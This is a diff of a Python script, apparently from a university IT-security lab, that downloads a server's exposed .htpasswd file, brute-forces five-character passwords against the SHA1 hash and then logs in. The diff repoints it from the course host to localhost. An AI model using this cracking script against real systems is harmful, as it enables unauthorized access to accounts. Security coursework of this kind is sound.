@@ -4,8 +4,8 @@ import requests
 import re
 
 import htpasswdlib
-URL_HASH = "https://t19.itsec.sec.in.tum.de/.htpasswd"
-URL = "https://t19.itsec.sec.in.tum.de"
+URL_HASH = "http://127.0.0.1:5000/.htpasswd"
+URL = "http://127.0.0.1:5000"
 
 chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
 combs = itertools.product(chars, repeat=5)
@@ -17,17 +17,19 @@ with requests.session() as session:
     username = ""
     hash_wert = ""
     password = ""
-    counter = 1
+
     print(matches)
     for match in matches:
         username, hash_wert = match
         break
     for c in combs:
-        print(counter)
-        if htpasswdlib.sha1_hash(username, "".join(c)) == hash_wert:
+        print("".join(c))
+        cc = htpasswdlib.sha1_hash(username, "".join(c))
+        match = re.search(r"\{SHA\}(.+)", cc)
+        if match.group(1) == hash_wert:
             password = c
             break
-        counter+=1
+
 
     print(password)
     data = {'username': username,
